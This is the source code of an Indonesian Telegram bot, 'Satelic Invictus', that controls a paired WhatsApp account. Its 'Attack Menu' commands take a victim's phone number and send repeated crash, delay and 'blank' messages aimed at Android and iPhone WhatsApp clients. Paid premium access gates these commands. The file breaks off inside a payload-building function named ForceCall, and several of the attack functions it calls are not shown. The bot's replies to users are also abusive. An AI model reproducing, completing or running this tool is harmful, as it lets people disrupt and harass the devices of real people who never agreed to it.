const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const { BOT_TOKEN } = require("./настройки/config");
const crypto = require("crypto");
const premiumFile = "./базы данных/premiumuser.json";
const adminFile = "./базы данных/adminuser.json";
const ownerFile = "./базы данных/owneruser.json";
const TOKENS_FILE = "./tokens.json";
const ownerID = 6976749991; // Ganti ID owner kamu
const prosesImg = "https://files.catbox.moe/w4ctqd.jpg";
//ISI PAKAI LINK FOTOMU
const successImg = "https://files.catbox.moe/76o04f.jpg";
//ISI PAKAI LINK FOTOMU

let bots = [];

const bot = new Telegraf(BOT_TOKEN);

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


bot.use(session());

let zaree = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
//////// Fungsi blacklist user \\\\\\
const blacklist = ["isi_bebas"];
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
  "https://files.catbox.moe/jx7vzx.jpg"
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

/////////// UNTUK MENYIMPAN DATA CD \\\\\\\\\\\\\\
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}



function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}
//////// FUNGSI VALID TOKEN \\\\\\\\\
const axios = require("axios");

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/DBWHOP/DBWHOP/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("❌ Token tidak valid! Bot tidak dapat dijalankan Buy akses di @YannX73."));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
}

function startBot() {
  console.log(
   chalk.bold.green(`
NAME SCRIPT : Satelic Invictus
VERSION : 1.0
NOTE : Jangan Menyalahgunakan Script ini!!! 
`));
}

validateToken();

///// --- Koneksi WhatsApp --- \\\\\
const store = makeInMemoryStore({
  logger: pino().child({ level: "silent", stream: "store" }),
});

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder
    }),
  };

  zaree = makeWASocket(connectionOptions);

  zaree.ev.on("creds.update", saveCreds);

  zaree.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`\n${chalk.green.bold("WHATSAPP TERHUBUNG")}`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log("WHATSAPP TERPUTUS");
      if (shouldReconnect) {
        console.log("HUBUNGKAN ULANG");
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Lu siapa? Lu bukan owner anjing kontol bangsat...");
  }
  next();
};
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin"
    );
  }
  next();
};
// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Lu Belum premium kentod...");
  }
  next();
};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
  fs.writeFileSync("./userID/admins.json", JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./userID/admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("️ WhatsApp belum terhubung njirr, pairing dulu lah, /connect 62xx");
    return;
  }
  next();
};
/////////=========MENU UTAMA========\\\\\\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
`\`\`\`Welcome To Satelic Invictus Version 1.0\`\`\`
╭━( INFORMASI SATELIC )
┃# Name : 𝐒𝐀𝐓𝐄𝐋𝐈𝐂 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒
┃# Version : 1.0
┃# User : ${Name} 
┃# User ID : ${userId}
┃# Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓
`\`\`\`© SATELIC INVICTUS\`\`\`
`;

  const mainKeyboard = [
    [
      {
        text: "Attack Menu </>",
        callback_data: "bug_menu",
      },
     ],
     [
      {
        text: "Owner Menu",
        callback_data: "owner_menu",
      },
    {
     text: "ThankS To", 
     callback_data: "thanks_to", 
      }, 
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    }
  })
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
╭━( Owner Menu </> )
┃◇ /addadmin [ id ]
  ╰➤ Menambah User Admin

┃◇ /addprem [ id ]
  ╰➤ Menambah User Premium

┃◇ /deladmin [ id ]
  ╰➤ Menghapus User Admin

┃◇ /delprem [ id ]
  ╰➤ Menghapus User Premium

┃◇ /connect [ 62xxx ]
  ╰➤ Connect Whatsapp

┃◇ /cekprem
  ╰➤ Mengecek Apakah User Premium

┃◇ /setjeda [ 1s ]
  ╰➤ Cooldown Setiap Ngebug
╰━━━━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Kembali", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
////handler thanks to
bot.action("thanks_to", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `\`\`\`
╭━━『 Thanks To </> 』
┃ Renzze [ Developer ]
┃ Sall [ Owner ]
┃ Alifz [ Owner ]
╰━━━━━━━━━━━━━━━❍
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Kembali", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage =  `
╭━(  Attack Menu </> )
┃◇ /superdelay
  ╰➤ Delay Hard Invisible

┃◇ /supercrash
  ╰➤ Crash Android

┃◇ /superios 
  ╰➤ Crash iPhone
  
┃◇ /superblank
  ╰➤ Blank X Crash
╰━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Kembali", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
`\`\`\`Welcome To Satelic Invictus Version 1.0\`\`\`
╭━( INFORMASI SATELIC )
┃# Name : 𝐒𝐀𝐓𝐄𝐋𝐈𝐂 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒
┃# Version : 1.0
┃# User : ${Name} 
┃# User ID : ${userId}
┃# Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓
`\`\`\`© SATELIC INVICTUS\`\`\`
`;

  const mainKeyboard = [
    [
      {
        text: "Attack Menu </>",
        callback_data: "bug_menu",
      },
     ],
     [
      {
        text: "Owner Menu",
        callback_data: "owner_menu",
      },
    {
     text: "ThankS To", 
     callback_data: "thanks_to", 
      }, 
    ],
  ];


const media = {
  type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };
    
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
////////// OWNER MENU \\\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});

//////// END \\\\\\\


/// 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐

//////// -- CASE BUG 1 --- \\\\\\\\\\\
bot.command("superblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Example: /superblank 62×××`);

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `\`\`\`
› Target: ${q}
› Status: Prosessing
› Type Bug: Blank X Crash
› 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown",
  });

  if (!ownerUsers.includes(ctx.from.id)) setGlobalCooldown();

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
› Target: ${q}
› Status: Prosessing
› Type Bug: Blank X Crash
› Peocces : ${progressStages[i]}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  for (let i = 0; i < 1; i++) {
    await DelayHard(45,target);
    await sleep(15000);
  }

  await ctx.telegram.editMessageMedia(
    chatId,
    sentMessage.message_id,
    undefined,
    {
      type: "photo",
      media: successImg,
      caption: `\`\`\`
› Target : ${q}
› Status: Successfully...
› Type Bug : Blank X Crash
› Procces : [██████████] 100%
\`\`\``,
      parse_mode: "Markdown",
    },
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.command("supercrash", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Example: /supercrash 62×××`);

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `\`\`\`
› Target : ${q}
› Status : Prosessing
› Type Bug : Crash Infinity
› Procces : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown",
  });

  if (!ownerUsers.includes(ctx.from.id)) setGlobalCooldown();

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
› Target : ${q}
› Status : Prosessing
› Type Bug : Crash Infinity
› Procces : ${progressStages[i]}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  for (let i = 0; i < 1; i++) {
    await DelayHard(45, target);
    await sleep(20000);
  }

  await ctx.telegram.editMessageMedia(
    chatId,
    sentMessage.message_id,
    undefined,
    {
      type: "photo",
      media: successImg,
      caption: `\`\`\`
› Target : ${q}
› Status : Successfully...
› Type Bug : Crash Infinity
› Procces : [██████████] 100%
\`\`\``,
      parse_mode: "Markdown",
    },
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.command("superdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Example: /superdelay 62×××`);

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `\`\`\`
› Target : ${q}
› Status : Prosessing
› Type Bug : Delay Hard Invisible
› Procces : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown",
  });

  if (!ownerUsers.includes(ctx.from.id)) setGlobalCooldown();

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
› Target : ${q}
› Status : Prosessing
› Type Bug : Delay Hard Invisible
› Procces : ${progressStages[i]}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  for (let i = 0; i < 100; i++) {
    await galaxy_invisible(target)
    await sleep(2000);
  }

  await ctx.telegram.editMessageMedia(
    chatId,
    sentMessage.message_id,
    undefined,
    {
      type: "photo",
      media: successImg,
      caption: `\`\`\`
› Target : ${q}
› Status : Successfully...
› Type Bug : Delay Hard Invisible
› Procces : [██████████] 100%
\`\`\``,
      parse_mode: "Markdown",
    },
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.command("superios", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Example: /superios 62×××`);

  if (!ownerUsers.includes(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[█░░░░░░░░░] 10%",
    "[██░░░░░░░░] 20%",
    "[███░░░░░░░] 30%",
    "[████░░░░░░] 40%",
    "[█████░░░░░] 50%",
    "[██████░░░░] 60%",
    "[███████░░░] 70%",
    "[████████░░] 80%",
    "[█████████░] 90%",
    "[██████████] 100%",
  ];

  const sentMessage = await ctx.sendPhoto(prosesImg, {
    caption: `\`\`\`
› Target : ${q}
› Status : Prosessing
› Type Bug : Crash iPhone
› Procces : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown",
  });

  if (!ownerUsers.includes(ctx.from.id)) setGlobalCooldown();

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
› Target : ${q}
› Status : Prosessing
› Type Bug : Crash iPhone
› Procces : ${progressStages[i]}
\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  for (let i = 0; i < 4; i++) {
    await zareeIos(target)
    await sleep(1000);
    await zareeIos(target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageMedia(
    chatId,
    sentMessage.message_id,
    undefined,
    {
      type: "photo",
      media: successImg,
      caption: `\`\`\`
› Target : ${q}
› Status : Successfully...
› Type Bug : Crash iPhone
› 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\``,
      parse_mode: "Markdown",
    },
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

// Hakbar Generator
function generateHakbar(percent) {
  const full = Math.floor(percent / 10);
  const empty = 10 - full;
  return `[${"█".repeat(full)}${"░".repeat(empty)}]`;
}
////𝘾𝙤𝙣𝙩𝙧𝙤𝙡 𝙈𝙚𝙣𝙪
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 526472198"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 57305916"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ Kelaz Bocah Idiot ini ${userId} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ Kelaz Bocah Idiot ini ${userId} sudah memiliki status premium.`
  );
});

// Perintah untuk menghapus pengguna premium (hanya owner)
// Command untuk restart
bot.command("restart", (ctx) => {
  const userId = ctx.from.id.toString();

  ctx.reply("Berhasil Merestart bot...");
  restartBot();
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  
  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem etmin🗿.`);
});


const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');

bot.command("brat", checkPremium, async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" "); 
    if (!text) {
        return ctx.reply("Eitss, Kakak Kurang Kasi Argumen Nya, Tolong Kasi Argumen\n Contoh: /brat CosmoGanteng");
    }

    try {
        const res = await getBuffer(`https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`);

        await ctx.replyWithSticker(
            { source: res },
            {
                packname: global.packname || "Puki", 
                author: global.author || "CosmoX",     
            }
        );
    } catch (error) {
        console.error(error);
        ctx.reply("❌ Terjadi kesalahan saat membuat stiker.");
    }
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return await ctx.reply(
      "❌ Masukin nomor nya ngentot, Contoh nih mek /connect <nomor_wa>"
    );
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (zaree && zaree.user) {
    return await ctx.reply("Masih Ada Sender Jika Tidak Terconnect Hapus Session Panel");
  }

  try {
    const code = await zaree.requestPairingCode(phoneNumber, "WHOOPSX3");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto("https://files.catbox.moe/g2og0z.jpg", {
      caption: `
\`\`\`HERE'S YOUR CODE !
▢ 𝙆𝙤𝙙𝙚 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝘼𝙣𝙙𝙖...
╰➤ 𝙉𝙤𝙢𝙤𝙧  : ${phoneNumber} 
╰➤ 𝙆𝙤𝙙𝙚   : ${formattedCode}
\`\`\`
`,

      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS."
    );
  }
});
// Handler untuk tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});
// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error("Gagal terhubung ke PM2:", err);
      return;
    }

    pm2.restart("index", (err) => {
      // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error("Gagal merestart bot:", err);
      } else {
        console.log("Bot berhasil direstart.");
      }
    });
  });
};
///////////////////[FUNC]////////////////
async function ForceCall(target) {
let InJectXploit = JSON.stringify({
status: true,
criador: "TheXtordcv",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnsockCect: true,
syncFullHistory: true,
